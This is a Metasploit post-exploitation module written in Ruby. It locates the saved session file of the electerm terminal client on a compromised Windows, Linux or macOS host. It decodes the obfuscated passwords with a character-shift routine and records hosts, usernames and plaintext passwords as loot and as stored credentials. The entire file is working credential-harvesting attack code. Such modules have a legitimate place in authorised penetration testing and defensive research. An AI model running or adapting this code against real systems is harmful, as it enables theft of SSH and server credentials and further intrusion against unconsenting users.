##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'json'
class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gather electerm Passwords',
        'Description' => %q{
          This module will determine if electerm is installed on the target system and, if it is, it will try to
          dump all saved session information from the target. The passwords for these saved sessions will then be decrypted
          where possible.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://blog.kali-team.cn/metasploit-electerm-6854f3d868eb45eab6951acc463a910d' ]
        ],
        'Author' => ['Kali-Team <kali-team[at]qq.com>'],
        'Platform' => [ 'linux', 'win', 'osx', 'unix'],
        'SessionTypes' => [ 'meterpreter', 'shell', 'powershell' ],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        OptString.new('BOOKMARKS_FILE_PATH', [ false, 'Specifies the electerm.bookmarks.nedb file path for electerm']),
      ]
    )
  end

  # Decrypt password https://github.com/electerm/electerm/blob/master/src/app/common/pass-enc.js
  def dec_electrm_password(enc)
    result = enc.chars.map.with_index do |s, i|
      ((s.ord - i - 1 + 65536) % 65536).chr
    end.join
    return result
  end

  def print_and_save(all_result)
    pw_tbl = Rex::Text::Table.new(
      'Header' => 'electerm Password',
      'Columns' => [
        'Title',
        'Type',
        'Host',
        'Port',
        'Username',
        'Password',
        'Description',
      ]
    )
    all_result.each do |value|
      next if !value.key?('username') || !value.key?('password')

      row = []
      row << value['title'] || ''
      row << value.fetch('type', 'ssh')
      row << value['host'] || ''
      row << value['port'] || ''
      row << value['username'] || ''
      row << value['password'] || ''
      row << value['description'] || ''
      pw_tbl << row
      config = {
        type: value['type'],
        host: value['host'],
        port: value['port'],
        username: value['username'],
        password: value['password']
      }
      electerm_store_config(config)
    end
    if pw_tbl.rows.count > 0
      path = store_loot('host.electerm', 'text/plain', session, pw_tbl, 'electerm.txt', 'electerm Password')
      print_good("Passwords stored in: #{path}")
      print_good(pw_tbl.to_s)
    end
  end

  def electerm_store_config(config)
    service_data = {
      address: config[:host],
      port: config[:port],
      service_name: config[:type],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: refname,
      private_type: :password,
      private_data: config[:password],
      username: config[:username]
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def parse_jsonlines(line)
    result_hashmap = Hash.new
    begin
      result_hashmap = JSON.parse(line)
    rescue ::JSON::ParserError => e
      raise Error::ParserError, "[parse_bookmarks] #{e.class} - #{e}"
    end
    if result_hashmap.key?('password') && result_hashmap.key?('passwordEncrypted')
      result_hashmap['password'] = dec_electrm_password(result_hashmap['password'])
    end
    return result_hashmap
  end

  def parse_json(bookmarks_path)
    some_result = []
    if session.platform == 'windows'
      bookmarks_path.gsub!('/') { '\\' }
    end
    begin
      if file_exist?(bookmarks_path)
        nedb_data = read_file(bookmarks_path) || ''
        print_error('The file could not be read') if nedb_data.empty?
        nedb_data.each_line do |line|
          some_result << parse_jsonlines(line)
        end
        credentials_config_loot_path = store_loot('host.electerm.creds', 'text/json', session, JSON.pretty_generate(some_result), bookmarks_path)
        print_good("electerm electerm.bookmarks.nedb saved to #{credentials_config_loot_path}")
        print_status("Finished processing #{bookmarks_path}")
      else
        print_error("Cannot find file #{bookmarks_path}")
      end
    rescue StandardError => e
      print_error("Error when parsing #{bookmarks_path}: #{e}")
    end
    return some_result
  end

  def get_bookmarks_path
    bookmarks_dir = ''
    case session.platform
    when 'windows'
      app_data = get_env('AppData')
      if app_data.present?
        bookmarks_dir = app_data + '\electerm\users\default_user'
      end
    when 'linux', 'osx', 'unix'
      home = get_env('HOME')
      if home.present?
        bookmarks_dir = home + '/.config/electerm/users/default_user'
      end
    end
    bookmarks_path = File.join(bookmarks_dir, 'electerm.bookmarks.nedb')
    return bookmarks_path
  end

  def run
    print_status('Gather electerm Passwords')
    all_result = []
    bookmarks_path = ''
    if datastore['BOOKMARKS_FILE_PATH'].present?
      bookmarks_path = datastore['BOOKMARKS_FILE_PATH']
      print_status("Looking for JSON files in #{bookmarks_path}")
      all_result += parse_json(bookmarks_path)
    end
    if bookmarks_path.empty?
      bookmarks_path = get_bookmarks_path
      if !bookmarks_path.blank?
        result = parse_json(bookmarks_path)
        if !result.empty?
          all_result += result
        end
      end
    end
    print_and_save(all_result)
  end
end
